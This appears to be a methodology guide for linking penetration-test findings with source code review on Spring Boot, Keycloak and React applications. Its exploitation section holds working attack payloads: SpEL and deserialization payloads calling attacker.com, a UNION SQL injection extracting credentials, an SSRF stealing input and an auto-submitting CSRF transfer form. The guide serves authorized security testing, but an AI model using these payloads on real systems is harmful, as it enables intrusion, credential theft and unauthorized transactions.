# ptest ↔ scode Integration Guide

Bidirectional workflow for combining external penetration testing (ptest) with source code review (scode) on the same target.

## When to Use

- You have both network access AND source code access to the same target
- ptest found external vulnerabilities and you want to find the root cause in code
- scode found code vulnerabilities and you want to confirm exploitability externally
- Internal pentest engagement with full access

---

## Direction 1: ptest Findings → scode Focus

When external testing finds a vulnerability, use it to guide code review.

### Unauthenticated Actuator

**ptest finding:** Actuator endpoints accessible without authentication (e.g., `/actuator/env`, `/actuator/heapdump`)

**Where to look in code:**
- `application.yml` / `application.properties` — `management.endpoints.web.exposure.include=*`
- `SecurityFilterChain` beans — look for `.requestMatchers("/actuator/**").permitAll()`
- `WebSecurityCustomizer` — `web.ignoring().requestMatchers("/actuator/**")`

**What confirms root cause:**
```java
// SecurityConfig.java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.authorizeHttpRequests(auth -> auth
        .requestMatchers("/actuator/**").permitAll()  // <-- ROOT CAUSE
        .anyRequest().authenticated()
    );
}
```

**Check for additional instances:**
- Search for other `.permitAll()` patterns on sensitive paths
- Check if management port is separated (`management.server.port`)
- Look for custom actuator endpoints in `@Endpoint` annotated classes

---

### CORS Reflection

**ptest finding:** Origin header reflected in `Access-Control-Allow-Origin` response

**Where to look in code:**
- `@CrossOrigin` annotations on controllers (check `origins` parameter)
- `CorsConfiguration` beans — look for `setAllowedOrigins(Arrays.asList("*"))` or dynamic origin setting
- `CorsFilter` or `WebMvcConfigurer.addCorsMappings()`

**What confirms root cause:**
```java
// CorsConfig.java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOriginPatterns(Arrays.asList("*"));  // <-- reflects any origin
    config.setAllowCredentials(true);  // <-- makes it exploitable
    return source;
}
```

**Check for additional instances:**
- `grep -r "CrossOrigin\|CorsConfiguration\|addCorsMappings" src/`
- Check if frontend origin is hardcoded vs pulled from env/config
- Look for per-controller overrides that may be more permissive

---

### Open redirect_uri (OAuth)

**ptest finding:** OAuth redirect_uri accepts arbitrary values or partial matches

**Where to look in code:**
- Keycloak realm config — `Valid Redirect URIs` setting
- Custom `RedirectResolver` implementations
- `application.yml` — `keycloak.redirect-rewrite-rules`
- React app — `redirect_uri` construction in auth library config

**What confirms root cause:**
```yaml
# Keycloak realm export or application config
keycloak:
  realm: myapp
  valid-redirect-uris:
    - "https://app.example.com/*"  # <-- wildcard allows path manipulation
```

```javascript
// React auth config (e.g., keycloak-js or oidc-client)
const keycloak = new Keycloak({
  redirectUri: window.location.origin + window.location.pathname  // <-- user-controlled
});
```

**Check for additional instances:**
- All OAuth client registrations in Keycloak admin
- Other redirect parameters (`post_logout_redirect_uri`, `login_hint`)
- Custom token exchange flows

---

### IDOR on /api/v1/users/{id}

**ptest finding:** Accessing other users' data by changing the ID parameter

**Where to look in code:**
- Controller method handling that path — check for `@PreAuthorize` or manual ownership check
- Service layer — does it filter by authenticated user?
- Repository layer — does the query include user context?

**What confirms root cause:**
```java
// UserController.java
@GetMapping("/api/v1/users/{id}")
public ResponseEntity<UserDTO> getUser(@PathVariable Long id) {
    // No @PreAuthorize, no ownership check
    return ResponseEntity.ok(userService.findById(id));  // <-- direct lookup, no authz
}
```

vs. what it should be:
```java
@GetMapping("/api/v1/users/{id}")
@PreAuthorize("@authz.isOwner(#id, authentication)")
public ResponseEntity<UserDTO> getUser(@PathVariable Long id) { ... }
```

**Check for additional instances:**
- All `@PathVariable` usages with entity IDs
- Search for `findById` calls without preceding authorization
- Check `@PreAuthorize` coverage across all controllers

---

### JWT Accepted Without Signature

**ptest finding:** JWT with `alg: none` or modified signature still accepted

**Where to look in code:**
- `application.yml` — `spring.security.oauth2.resourceserver.jwt.*` config
- Custom `JwtDecoder` beans — check if signature verification is configured
- Keycloak adapter config — `verify-token-audience`, `realm-public-key`

**What confirms root cause:**
```yaml
# Missing or misconfigured JWT validation
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          # Missing jwk-set-uri means no signature verification
          issuer-uri: https://keycloak.example.com/realms/myapp
```

```java
// Custom decoder without signature verification
@Bean
public JwtDecoder jwtDecoder() {
    return NimbusJwtDecoder.withPublicKey(null).build();  // <-- no key = no verification
}
```

**Check for additional instances:**
- Multiple resource server configs (different microservices)
- Token exchange between services — are internal tokens validated?
- WebSocket authentication — does it validate JWT the same way?

---

### Heapdump Exposed

**ptest finding:** `/actuator/heapdump` accessible, contains secrets in memory

**Where to look in code:**
- Same as actuator config above, plus:
- What secrets are in memory? Check `@Value` injections, `Environment` bean usage
- Database credentials, API keys, encryption keys loaded at startup

**What confirms root cause:**
```yaml
management:
  endpoints:
    web:
      exposure:
        include: "*"  # <-- exposes heapdump
  endpoint:
    heapdump:
      enabled: true  # <-- default is true
```

**Check for additional instances:**
- Are secrets rotatable? Check if they're from Vault vs. static config
- Other memory-resident secrets: session keys, cached tokens
- Thread dump exposure (`/actuator/threaddump`) — may leak request data

---

### Rate Limit Bypass

**ptest finding:** No rate limiting on authentication or sensitive endpoints

**Where to look in code:**
- Rate limit filter/interceptor configuration
- Per-endpoint annotations (e.g., `@RateLimited`)
- API gateway config (if using Spring Cloud Gateway)
- Bucket4j or Resilience4j configuration

**What confirms root cause:**
```java
// No rate limit filter registered, or:
@Bean
public FilterRegistrationBean<RateLimitFilter> rateLimitFilter() {
    FilterRegistrationBean<RateLimitFilter> bean = new FilterRegistrationBean<>();
    bean.setFilter(new RateLimitFilter());
    bean.addUrlPatterns("/api/public/*");  // <-- only covers public, not /api/v1/auth/login
    return bean;
}
```

**Check for additional instances:**
- All authentication endpoints (login, password reset, OTP verification)
- File upload endpoints (resource exhaustion)
- Search/export endpoints (data exfiltration at scale)

---

### Mass Assignment

**ptest finding:** Adding extra fields to request body modifies unintended properties (e.g., `role`, `isAdmin`)

**Where to look in code:**
- Controller method — does it bind directly to entity or use a DTO?
- DTO class — does it include sensitive fields?
- Entity class — are sensitive fields annotated with `@JsonIgnore`?

**What confirms root cause:**
```java
// Binding directly to entity — all fields settable
@PostMapping("/api/v1/users")
public ResponseEntity<User> createUser(@RequestBody User user) {  // <-- entity, not DTO
    return ResponseEntity.ok(userRepository.save(user));
}

// User.java entity
@Entity
public class User {
    private String name;
    private String email;
    private String role;      // <-- mass-assignable!
    private boolean isAdmin;  // <-- mass-assignable!
}
```

**Check for additional instances:**
- All `@RequestBody` parameters — entity vs DTO?
- `ModelMapper` or `MapStruct` configs — do they map all fields?
- PATCH endpoints — partial update logic

---

### SQL Injection

**ptest finding:** SQL injection confirmed on a parameter

**Where to look in code:**
- Repository interfaces — `@Query` with string concatenation
- Native queries — `nativeQuery = true` with parameter interpolation
- `JdbcTemplate` usage with string building
- Dynamic query builders (Criteria API misuse)

**What confirms root cause:**
```java
// Repository with vulnerable native query
@Query(value = "SELECT * FROM users WHERE name = '" + "#{#name}" + "'", nativeQuery = true)
List<User> findByNameUnsafe(@Param("name") String name);

// Or in service layer
@Repository
public class CustomRepo {
    @Autowired JdbcTemplate jdbc;
    
    public List<User> search(String term) {
        return jdbc.query("SELECT * FROM users WHERE name LIKE '%" + term + "%'",  // <-- SQLi
            new UserRowMapper());
    }
}
```

**Check for additional instances:**
- All `nativeQuery = true` usages
- All `JdbcTemplate.query()` calls with string concatenation
- Stored procedure calls with dynamic parameters
- Search/filter endpoints with multiple parameters

---

### SSRF

**ptest finding:** Server makes requests to attacker-controlled URLs

**Where to look in code:**
- `RestTemplate` or `WebClient` usage with user-supplied URL components
- Webhook/callback URL features
- File import from URL features
- PDF generation with external resource loading

**What confirms root cause:**
```java
// WebhookService.java
public void sendWebhook(String callbackUrl, String payload) {
    // No URL validation — user controls full URL
    restTemplate.postForEntity(callbackUrl, payload, String.class);  // <-- SSRF
}

// Or partial control
public byte[] fetchAvatar(String userId) {
    String url = "http://internal-cdn.local/avatars/" + userId + ".png";  // <-- path traversal → SSRF
    return restTemplate.getForObject(url, byte[].class);
}
```

**Check for additional instances:**
- All `RestTemplate`/`WebClient` calls — trace URL source
- URL validation logic — does it block internal IPs? (check for bypass via DNS rebinding, IPv6, redirects)
- Other HTTP clients (OkHttp, Apache HttpClient)

---

## Direction 2: scode Findings → ptest Exploitation

When code review finds a vulnerability, use it to craft targeted exploits.

### Missing @PreAuthorize on Endpoint

**scode finding:** Controller method lacks authorization annotation

**How to exploit externally:**
1. From code, identify the exact HTTP method and path: `GET /api/v1/admin/reports`
2. Obtain a low-privilege token (regular user)
3. Send request to that path with the low-priv token
4. If no token at all is needed, try unauthenticated

**What code knowledge gives you:**
- Exact path (no fuzzing needed)
- HTTP method
- Required request body/parameters
- Whether it's truly unprotected vs. protected at service layer

**Documentation chain:**
```markdown
**Code Evidence:** `AdminReportController.java:32` — no @PreAuthorize annotation
**External PoC:** GET /api/v1/admin/reports with user-role token returns 200 + admin data
**Impact:** Horizontal/vertical privilege escalation confirmed
```

---

### SpEL Injection in @PreAuthorize

**scode finding:** User input reaches SpEL expression evaluation

**How to exploit externally:**
```java
// Code shows:
@PreAuthorize("hasRole(@roleService.getRole(#request.getHeader('X-Role')))")
```

**Craft exploit:**
```
GET /api/v1/resource
X-Role: ') or T(java.lang.Runtime).getRuntime().exec('curl attacker.com') or ('
```

**What code knowledge gives you:**
- Exact header/parameter name that reaches SpEL
- The expression structure (know where to inject)
- Available classes on classpath for gadgets

**Documentation chain:**
```markdown
**Code Evidence:** SpEL expression in `SecurityConfig.java:45` evaluates header value
**External PoC:** X-Role header with SpEL payload achieves RCE
**Impact:** Remote Code Execution via authorization bypass
```

---

### Unsafe Deserialization (Jackson defaultTyping)

**scode finding:** Jackson `ObjectMapper` configured with `enableDefaultTyping()`

**How to exploit externally:**
```java
// Code shows:
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // <-- polymorphic deserialization
```

**Craft exploit:**
```json
{
  "name": "test",
  "payload": ["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName": "ldap://attacker.com/exploit", "autoCommit": true}]
}
```

**What code knowledge gives you:**
- Which endpoints use this ObjectMapper
- What classes are on the classpath (available gadgets)
- Whether there's a `PolymorphicTypeValidator` (and what it allows)

**Documentation chain:**
```markdown
**Code Evidence:** `JacksonConfig.java:12` enables default typing without validator
**External PoC:** Polymorphic payload on POST /api/v1/import triggers JNDI lookup
**Impact:** Remote Code Execution via deserialization
```

---

### Hardcoded API Key in Config

**scode finding:** API key or secret in source code or config file

**How to exploit externally:**
```yaml
# application.yml
third-party:
  payment-gateway:
    api-key: "sk_live_EXAMPLE_REDACTED_KEY_HERE"
```

**Craft exploit:**
- Use the key directly against the third-party service
- Check if it grants access to production data
- Determine scope/permissions of the key

**What code knowledge gives you:**
- The exact key value
- Which service it's for
- What operations the code performs with it (scope of access)

**Documentation chain:**
```markdown
**Code Evidence:** Hardcoded Stripe secret key in `application-prod.yml:23`
**External PoC:** Key valid against Stripe API, can list all customers and charges
**Impact:** Financial data exposure, potential unauthorized transactions
```

---

### SQL Injection in Native Query

**scode finding:** String concatenation in SQL query

**How to exploit externally:**
```java
// Code shows exact query structure:
"SELECT * FROM orders WHERE customer_id = " + customerId + " AND status = '" + status + "'"
```

**Craft exploit:**
```
GET /api/v1/orders?status=delivered' UNION SELECT username,password,null,null FROM users--
```

**What code knowledge gives you:**
- Exact query structure (number of columns, table names)
- Which parameter is injectable
- Database type and schema (from entity classes)
- No need for blind enumeration

**Documentation chain:**
```markdown
**Code Evidence:** `OrderRepository.java:28` concatenates `status` parameter into native query
**External PoC:** UNION-based injection extracts user credentials
**Impact:** Full database access, credential theft
```

---

### SSRF with Partial URL Control

**scode finding:** User input used in URL construction

**How to exploit externally:**
```java
// Code shows:
String url = "http://internal-api.local/v1/" + userInput + "/profile";
```

**Craft exploit:**
```
userInput = "@attacker.com/steal?orig=http://internal-api.local/v1/"
// or
userInput = "../../admin/secrets#"
```

**What code knowledge gives you:**
- Exact URL template (know what prefix/suffix to work around)
- Internal hostnames and ports
- What HTTP client is used (redirect behavior)

**Documentation chain:**
```markdown
**Code Evidence:** `ProfileService.java:55` constructs URL with user-controlled path segment
**External PoC:** Path traversal in parameter reaches internal admin API
**Impact:** Access to internal services, potential credential theft
```

---

### Race Condition (No Locking)

**scode finding:** State-changing operation without synchronization or optimistic locking

**How to exploit externally:**
```java
// Code shows:
public void redeemCoupon(String couponCode, Long userId) {
    Coupon coupon = couponRepo.findByCode(couponCode);  // read
    if (!coupon.isRedeemed()) {                          // check
        coupon.setRedeemed(true);                        // modify
        coupon.setRedeemedBy(userId);
        couponRepo.save(coupon);                         // write
        walletService.addCredit(userId, coupon.getValue());
    }
}
```

**Craft exploit:**
- Send 50 concurrent requests to redeem the same coupon
- Know exact endpoint and timing (TOCTOU window between read and write)

**What code knowledge gives you:**
- Exact race window (which operations are non-atomic)
- No `@Transactional(isolation = SERIALIZABLE)` or `@Version` field
- Exact endpoint and parameters needed

**Documentation chain:**
```markdown
**Code Evidence:** `CouponService.java:34` — check-then-act without locking
**External PoC:** 50 concurrent requests, coupon redeemed 12 times (credited $1200 instead of $100)
**Impact:** Financial loss, unlimited coupon redemption
```

---

### Missing CSRF on State-Changing Endpoint

**scode finding:** CSRF protection disabled or endpoint excluded

**How to exploit externally:**
```java
// Code shows:
http.csrf(csrf -> csrf.ignoringRequestMatchers("/api/v1/transfer/**"));
```

**Craft exploit:**
```html
<form action="https://target.com/api/v1/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
  <script>document.forms[0].submit();</script>
</form>
```

**What code knowledge gives you:**
- Which endpoints lack CSRF protection
- Whether session cookies are used (SameSite attribute?)
- Exact form parameters needed

**Documentation chain:**
```markdown
**Code Evidence:** `SecurityConfig.java:28` disables CSRF for /api/v1/transfer/**
**External PoC:** CSRF PoC page triggers unauthorized transfer when victim visits
**Impact:** Unauthorized financial transactions
```

---

## Direction 3: Combined Reporting

When you have both code-level and external evidence, findings are significantly stronger.

### Finding Template (Combined)

```markdown
## [FINDING-N] Title

**Severity:** Critical/High/Medium/Low
**CVSS:** X.X
**Evidence Type:** Code Review + External Verification

### Root Cause (from code review)
- **File:** `src/main/java/com/example/Controller.java:45`
- **Issue:** Missing authorization check on endpoint
- **Code snippet:**
  ```java
  @GetMapping("/api/v1/admin/users")
  public List<User> getAllUsers() {
      return userService.findAll();  // No @PreAuthorize
  }
  ```

### External Proof (from pentest)
- **Request:**
  ```http
  GET /api/v1/admin/users HTTP/1.1
  Host: target.example.com
  Authorization: Bearer <regular-user-token>
  ```
- **Response:** 200 OK with all user records including PII
- **Impact demonstrated:** Regular user accessed admin-only data for 50,000 users

### Systemic Analysis
- 7 other endpoints in `AdminController.java` have the same missing annotation
- 3 endpoints in `ReportController.java` follow the same pattern
- Affected endpoints:
  - GET /api/v1/admin/users
  - GET /api/v1/admin/audit-log
  - POST /api/v1/admin/export
  - GET /api/v1/reports/financial
  - ...

### Remediation
- **Code fix:** Add `@PreAuthorize("hasRole('ADMIN')")` to all admin endpoints
- **Configuration fix:** Implement URL-based authorization in SecurityFilterChain as defense-in-depth
- **Architectural recommendation:** Create `@AdminOnly` meta-annotation, enforce via ArchUnit test
```

---

## Workflow Integration

### Scenario A: ptest First, Then scode

Best when: You start with a standard external pentest, then get code access mid-engagement.

1. **Complete ptest phases 1-6** — find external vulns through standard methodology
2. **Request source code access** — use findings to justify code review need
3. **Map ptest findings to code components:**
   - Vulnerable endpoint → which controller/service handles it?
   - Misconfiguration → which config file defines it?
4. **Run targeted scode review** on affected components:
   - Focus scanners on vulnerability classes already found
   - Look for same patterns in adjacent code
5. **Find additional instances** of same vulnerability patterns:
   - Found one IDOR? Search all controllers for same pattern
   - Found one SQLi? Check all native queries
6. **Combined report** with root cause + external proof + systemic count

**Example (Spring Boot + Keycloak):**
```
ptest found: IDOR on GET /api/v1/orders/{id}
→ scode: Check OrderController.java → missing @PreAuthorize
→ scode: grep all controllers → 12 more endpoints with same issue
→ Report: 13 IDOR vulnerabilities, 1 externally confirmed, 12 from code review
```

---

### Scenario B: scode First, Then ptest

Best when: You have source code access before network access (e.g., pre-deployment review).

1. **Complete scode steps 1-4** — find code vulnerabilities
2. **Prioritize findings by exploitability:**
   - Which findings are reachable from external requests?
   - Which have highest impact if exploited?
3. **Craft targeted ptest exploits** from code knowledge:
   - Skip broad scanning — you know exactly what to hit
   - Build precise payloads using query structure, parameter names, etc.
4. **Confirm exploitability externally:**
   - Some code vulns may not be reachable (dead code, internal-only)
   - External confirmation proves real-world impact
5. **Combined report** — code finding + exploitation proof

**Example (Spring Boot + Keycloak):**
```
scode found: SQL injection in UserRepository.java native query
→ ptest: Craft UNION injection knowing exact column count (5) and table names
→ ptest: Extract admin credentials in single request (no blind enumeration needed)
→ Report: SQLi with full exploitation chain, code fix + WAF recommendation
```

---

### Scenario C: Parallel (Recommended for Internal Pentests)

Best when: Full internal engagement with both network and code access from day one.

1. **Start ptest Phase 1-3** (recon + enumeration):
   - Discover live endpoints, technology stack, API surface
2. **Simultaneously start scode Step 1-2** (recon + threat model):
   - Map architecture, identify high-risk components
3. **Share intelligence bidirectionally:**
   - ptest discovers endpoints → scode knows what code to focus on
   - scode finds auth gaps → ptest knows what to exploit
   - ptest finds tech versions → scode checks for known vulnerable patterns
4. **ptest Phase 5-6 informed by scode findings:**
   - Exploit code-confirmed vulnerabilities
   - Skip false positives identified by code review
5. **scode Step 3 scanners prioritized by ptest attack surface:**
   - Focus on externally-reachable components first
   - Deprioritize internal-only code paths
6. **Combined validation and reporting:**
   - Every finding has both code evidence and external proof where possible
   - Systemic analysis from code, impact proof from pentest

**Example timeline (1-week engagement):**
```
Day 1: ptest recon + scode architecture review
Day 2: ptest enumeration + scode threat model
Day 3: Intelligence sharing session — align priorities
Day 4: ptest exploitation (guided by scode) + scode deep scan (guided by ptest surface)
Day 5: Combined validation, report writing
```

---

## Scanner Priority Mapping

Map ptest phases to scode scanners for efficient parallel work.

### Phase 3: Actuator/Admin Interfaces Found

**Priority scode scanners:** `misconfig`, `data-exposure`

**What to scan for:**
- Management endpoint exposure configuration
- Sensitive data in environment/config properties
- Admin interface authentication requirements

```bash
# scode focus areas
grep -r "management.endpoints" src/main/resources/
grep -r "actuator\|management" **/SecurityConfig*.java
```

---

### Phase 5: CORS Reflection

**Priority scode scanners:** `misconfig` (CORS section)

**What to scan for:**
- CORS configuration beans
- Per-controller `@CrossOrigin` annotations
- Dynamic origin validation logic

```bash
# scode focus areas
grep -r "CrossOrigin\|CorsConfiguration\|allowedOrigins" src/
```

---

### Phase 5: OAuth Issues

**Priority scode scanners:** `authn-session`, `misconfig`

**What to scan for:**
- Keycloak adapter configuration
- Token validation settings
- Redirect URI validation
- Session management configuration

```bash
# scode focus areas
grep -r "keycloak\|oauth2\|redirect.uri\|token" src/main/resources/
find . -name "*.json" | xargs grep -l "realm\|client"  # Keycloak realm exports
```

---

### Phase 6: IDOR Confirmed

**Priority scode scanners:** `access-control`

**What to scan for:**
- All `@PathVariable` with entity IDs
- Missing `@PreAuthorize` annotations
- Service methods without ownership checks
- Repository queries without user context filtering

```bash
# scode focus areas
grep -rn "PathVariable\|@PreAuthorize\|@Secured" src/main/java/**/controller/
grep -rn "findById\|getById" src/main/java/**/service/
```

---

### Phase 6: Injection Found

**Priority scode scanners:** `injection`

**What to scan for:**
- Native queries with string concatenation
- `JdbcTemplate` with dynamic SQL
- SpEL expressions with user input
- LDAP queries with concatenation
- OS command execution

```bash
# scode focus areas
grep -rn "nativeQuery\|JdbcTemplate\|ProcessBuilder\|Runtime.exec" src/
grep -rn "@Query" src/ | grep -v "?1\|:param"  # Queries without parameterization
```

---

### Phase 6: SSRF Found

**Priority scode scanners:** `ssrf`

**What to scan for:**
- `RestTemplate` / `WebClient` with user-controlled URLs
- URL construction from user input
- Webhook/callback features
- File import from URL
- Image/document fetching

```bash
# scode focus areas
grep -rn "RestTemplate\|WebClient\|HttpClient\|URL(" src/
grep -rn "webhook\|callback\|fetch\|download" src/main/java/
```

---

### Phase 7: Heapdump Secrets

**Priority scode scanners:** `data-exposure`, `crypto`

**What to scan for:**
- Secrets loaded into memory (`@Value` for passwords/keys)
- Encryption key management (hardcoded vs. vault)
- Credential rotation capability
- Sensitive data in application properties

```bash
# scode focus areas
grep -rn "@Value.*password\|@Value.*secret\|@Value.*key" src/
grep -rn "private.*key\|api.key\|secret" src/main/resources/
```

---

## Quick Reference: Integration Commands

### From ptest context, pivot to scode:

```
"I found [vulnerability] on [endpoint]. Run scode [scanner] focused on the code handling that endpoint."
```

### From scode context, pivot to ptest:

```
"Code review found [vulnerability] in [file:line]. Craft a ptest exploit for [endpoint] using this knowledge: [relevant code details]."
```

### Combined validation:

```
"Validate scode finding [X] externally: the code at [file:line] shows [vulnerability]. 
The endpoint is [method] [path], parameters are [params]. Expected behavior: [what should happen if vuln is real]."
```

---

## Architecture-Specific Notes (Spring Boot + Keycloak + React)

### Spring Boot Patterns to Cross-Reference

| Component | ptest Surface | scode Location |
|---|---|---|
| Controllers | API endpoints | `src/main/java/**/controller/` |
| Security config | Auth behavior | `**/SecurityConfig.java`, `**/WebSecurityConfig.java` |
| Properties | Runtime config | `src/main/resources/application*.yml` |
| Filters | Request processing | `**/filter/`, registered in config |
| Error handling | Info disclosure | `@ControllerAdvice`, `@ExceptionHandler` |

### Keycloak Patterns to Cross-Reference

| Component | ptest Surface | scode Location |
|---|---|---|
| Realm config | Token validation | `realm-export.json`, `application.yml` keycloak section |
| Client config | Redirect URIs, scopes | Keycloak admin or IaC files |
| Role mappings | Authorization | `@PreAuthorize`, `@RolesAllowed` |
| Token settings | JWT lifetime, refresh | Keycloak realm settings |

### React Frontend Patterns to Cross-Reference

| Component | ptest Surface | scode Location |
|---|---|---|
| Auth state | Token storage | `src/auth/`, localStorage/sessionStorage usage |
| API calls | Request construction | `src/api/`, `src/services/` |
| Route guards | Client-side authz | `src/routes/`, `PrivateRoute` components |
| Environment | API URLs, keys | `.env*`, `src/config/` |

**Key insight:** React client-side checks are never security controls. If scode finds a route guard without corresponding server-side authorization, that's a ptest target — bypass the client and hit the API directly.
